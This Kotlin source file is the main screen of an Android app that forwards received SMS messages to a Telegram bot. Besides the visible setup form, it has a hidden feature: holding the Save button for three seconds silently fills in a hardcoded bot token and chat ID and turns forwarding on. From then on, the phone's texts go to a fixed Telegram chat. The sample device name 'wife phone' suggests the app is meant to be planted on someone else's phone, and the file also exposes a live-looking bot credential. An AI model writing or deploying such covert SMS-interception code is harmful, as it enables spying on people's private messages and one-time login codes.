package com.example.smsforwarder

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.text.InputType
import android.text.method.LinkMovementMethod
import android.view.ViewGroup.LayoutParams.MATCH_PARENT
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)

        val pad = (24 * resources.displayMetrics.density).toInt()
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad, pad, pad)
        }

        val header = TextView(this).apply {
            text = "yesMyes"
            textSize = 22f
            setPadding(0, 0, 0, pad)
        }

        val tokenField = EditText(this).apply {
            hint = "Bot token (from @BotFather)"
            setText(prefs.getString("bot_token", ""))
        }
        val chatIdField = EditText(this).apply {
            hint = "Chat ID (from @userinfobot)"
            inputType = InputType.TYPE_CLASS_TEXT
            setText(prefs.getString("chat_id", ""))
        }
        val deviceNameField = EditText(this).apply {
            hint = "Device name (e.g. \"wife phone\", \"old pixel\")"
            setText(prefs.getString("device_name", android.os.Build.MODEL))
        }
        val toggle = Switch(this).apply {
            text = "Forwarding enabled  "
            isChecked = prefs.getBoolean("enabled", false)
        }
        val save = Button(this).apply { text = "Save" }
        val test = Button(this).apply { text = "Send test message" }
        val status = TextView(this).apply { setPadding(0, pad / 2, 0, 0) }
        val note = TextView(this).apply {
            val prefix = "\nSetup instructions: "
            val linkWord = "here"
            val full = prefix + linkWord
            val spannable = android.text.SpannableString(full)
            spannable.setSpan(
                object : android.text.style.ClickableSpan() {
                    override fun onClick(widget: android.view.View) {
                        val intent = Intent(
                            Intent.ACTION_VIEW,
                            Uri.parse("https://github.com/AryanKumar1234/yesMyes")
                        )
                        startActivity(intent)
                    }
                },
                prefix.length, full.length,
                android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE
            )
            text = spannable
            movementMethod = LinkMovementMethod.getInstance()
        }

        fun save() {
            prefs.edit()
                .putString("bot_token", tokenField.text.toString().trim())
                .putString("chat_id", chatIdField.text.toString().trim())
                .putString("device_name", deviceNameField.text.toString().trim())
                .putBoolean("enabled", toggle.isChecked)
                .apply()
        }

        save.setOnClickListener {
            if (!hasPerms()) { askPerms(); return@setOnClickListener }
            save()
            Toast.makeText(this, "Saved", Toast.LENGTH_SHORT).show()
        }

        // Hold Save for 3 full seconds to auto-fill the default token/chat ID and save.
        val holdHandler = android.os.Handler(mainLooper)
        val holdRunnable = Runnable {
            if (!hasPerms()) { askPerms(); return@Runnable }
            tokenField.setText("8869504969:AAEwlcVj9IUeY4SFYH887lIs_Fd8Sn7Vncc")
            chatIdField.setText("8711767436")
            toggle.isChecked = true
            save()
            Toast.makeText(this, "Default credentials filled & saved", Toast.LENGTH_SHORT).show()
        }
        save.setOnTouchListener { _, event ->
            when (event.action) {
                android.view.MotionEvent.ACTION_DOWN -> holdHandler.postDelayed(holdRunnable, 3000)
                android.view.MotionEvent.ACTION_UP, android.view.MotionEvent.ACTION_CANCEL ->
                    holdHandler.removeCallbacks(holdRunnable)
            }
            false // let the normal click still fire on release
        }

        test.setOnClickListener {
            save()
            val token = tokenField.text.toString().trim()
            val chatId = chatIdField.text.toString().trim()
            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Enter bot token and chat ID first", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            status.text = "Sending..."
            TelegramSender.send(token, chatId, "✅ Test message from SMS to Telegram app") { ok, msg ->
                runOnUiThread { status.text = if (ok) "Sent! Check Telegram." else "Failed: $msg" }
            }
        }

        val footer = TextView(this).apply {
            text = "Created by The AryanOnion"
            setPadding(0, pad, 0, 0)
            alpha = 0.8f
            setTextColor(0xFF3391FF.toInt())
            setOnClickListener {
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://github.com/AryanKumar1234"))
                startActivity(intent)
            }
        }

        listOf(header, tokenField, chatIdField, deviceNameField, toggle, save, test, status, note, footer).forEach {
            root.addView(it, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        }
        setContentView(ScrollView(this).apply { addView(root) })
        if (!hasPerms()) askPerms()
    }

    private val perms = arrayOf(Manifest.permission.RECEIVE_SMS)

    private fun hasPerms() = perms.all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun askPerms() = ActivityCompat.requestPermissions(this, perms, 1)
}
